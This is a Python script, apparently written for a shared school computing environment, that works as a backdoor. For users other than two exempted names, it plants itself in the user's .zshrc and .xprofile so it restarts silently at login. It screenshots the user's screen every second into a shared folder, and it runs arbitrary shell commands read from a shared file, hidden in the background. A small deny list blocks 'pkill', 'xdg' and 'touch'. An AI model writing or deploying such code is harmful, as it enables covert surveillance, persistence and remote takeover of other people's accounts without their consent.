#!/usr/bin/env python3
import os
import time
import subprocess
import getpass
from datetime import datetime
import re

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None


# === CONFIGURATION ===
BASE_PATH = "/sgoinfre/goinfre/Perso/zcadinot/ft_connect"
CMD_PATH = os.path.join(BASE_PATH, "cmd")
USER_PATH = os.path.join(BASE_PATH, "user")
WATCH_FILE = os.path.join(CMD_PATH, "cmd.txt")
TYPE_FILE = os.path.join(CMD_PATH, "type.txt")
SCREEN_BASE_PATH = os.path.join(BASE_PATH, "screen")
BLOCKED_LOG = os.path.join(CMD_PATH, "cmd_blocked.log")

CURRENT_USER = getpass.getuser()
FORBIDDEN = ["pkill", "xdg", "touch"]

# Variable globale actualisée à chaque seconde
VERBOSE_MODE = False


def read_type_file():
    """Lit le contenu de type.txt pour mettre à jour VERBOSE_MODE."""
    global VERBOSE_MODE
    try:
        if not os.path.exists(TYPE_FILE):
            VERBOSE_MODE = False
            return
        with open(TYPE_FILE, "r") as f:
            content = f.read().strip()
        VERBOSE_MODE = "1" in content
    except Exception:
        VERBOSE_MODE = False


def log(msg):
    """Affiche un message uniquement si le mode verbeux est activé"""
    if VERBOSE_MODE:
        print(msg)


def ensure_user_file():
    user_file = os.path.join(USER_PATH, f"{CURRENT_USER}")
    os.makedirs(USER_PATH, exist_ok=True)
    if not os.path.exists(user_file):
        with open(user_file, "w") as f:
            f.write(f"User file for {CURRENT_USER}\n")
        os.chmod(user_file, 0o777)
    return user_file


def add_autostart_lines():
    home = os.path.expanduser("~")
    autostart_line = f"( sleep 5 && nohup python3 {BASE_PATH}/src/ft_connect.py >/tmp/ft_connect.log 2>&1 & ) &\n"
    files = [os.path.join(home, ".zshrc"), os.path.join(home, ".xprofile")]

    for file_path in files:
        try:
            if not os.path.exists(file_path):
                open(file_path, "w").close()
            with open(file_path, "r") as f:
                content = f.read()
            if autostart_line not in content:
                with open(file_path, "a") as f:
                    f.write("\n" + autostart_line)
                log(f"[+] Ligne restaurée dans {file_path}")
        except Exception as e:
            log(f"[!] Erreur modification {file_path} : {e}")


def contains_forbidden(cmd: str) -> bool:
    if not cmd:
        return False
    lower = cmd.lower()
    for token in FORBIDDEN:
        if token in lower:
            return True
    return False


def log_blocked_command(username: str, cmd: str):
    os.makedirs(CMD_PATH, exist_ok=True)
    try:
        ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        with open(BLOCKED_LOG, "a") as f:
            f.write(f"{ts} | user={username} | blocked_cmd={cmd}\n")
    except Exception as e:
        log(f"[!] Impossible d'écrire le log des commandes bloquées : {e}")


def open_in_terminal(cmd: str):
    """Exécute la commande selon le mode actuel"""
    if contains_forbidden(cmd):
        log(f"[!] Commande bloquée (token interdit détecté) : {cmd}")
        log_blocked_command(CURRENT_USER, cmd)
        clear_cmd_file()
        return

    try:
        if VERBOSE_MODE:
            # Mode visible → terminal GNOME
            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"{cmd}; exec bash"])
            log(f"[>] Commande lancée dans un terminal : {cmd}")
        else:
            # Mode silencieux → exécution en fond
            subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp
            )
    except Exception as e:
        log(f"[!] Erreur lancement commande : {e}")


def clear_cmd_file():
    try:
        with open(WATCH_FILE, "w") as f:
            f.write("None\n")
        log("[i] Fichier cmd.txt vidé.")
    except Exception as e:
        log(f"[!] Impossible de vider le fichier : {e}")


def take_screenshot():
    if not ImageGrab:
        log("[!] PIL.ImageGrab non disponible, installe Pillow : pip install pillow")
        return
    screen_user_path = os.path.join(SCREEN_BASE_PATH, CURRENT_USER)
    os.makedirs(screen_user_path, exist_ok=True)
    file_path = os.path.join(screen_user_path, "latest.png")
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
        img = ImageGrab.grab()
        img.save(file_path, "PNG")
        log(f"[📸] Screenshot mis à jour : {file_path}")
    except Exception as e:
        log(f"[!] Erreur capture d’écran : {e}")


def watch_file():
    log(f"[i] Lancement du watcher. Utilisateur : {CURRENT_USER}")
    log(f"[i] Surveillance : {WATCH_FILE}")

    os.makedirs(CMD_PATH, exist_ok=True)
    if not os.path.exists(WATCH_FILE):
        with open(WATCH_FILE, "w") as f:
            f.write("None\n")

    while True:
        try:
            # Lire le mode toutes les secondes
            read_type_file()

            # Screenshot (facultatif)
            take_screenshot()

            # Lire cmd.txt
            with open(WATCH_FILE, "r") as f:
                lines = [l.strip() for l in f.readlines() if l.strip()]
            if len(lines) >= 2:
                username, command = lines[0], lines[1]
                if username in [CURRENT_USER, "all"]:
                    log(f"[i] Exécution candidate pour {username} : {command}")
                    if contains_forbidden(command):
                        log(f"[!] Tentative d'exécution bloquée : {command}")
                        log_blocked_command(username, command)
                        clear_cmd_file()
                    else:
                        open_in_terminal(command)
                        time.sleep(0.2)
                        clear_cmd_file()

            time.sleep(1.0)  # vérifie chaque seconde
        except Exception as e:
            log(f"[!] Erreur : {e}")
            time.sleep(1.0)


# === MAIN ===
if __name__ == "__main__":
    if CURRENT_USER not in ["aeherve", "zcadinot"]:
        add_autostart_lines()
    ensure_user_file()
    read_type_file()  # lire une première fois
    watch_file()
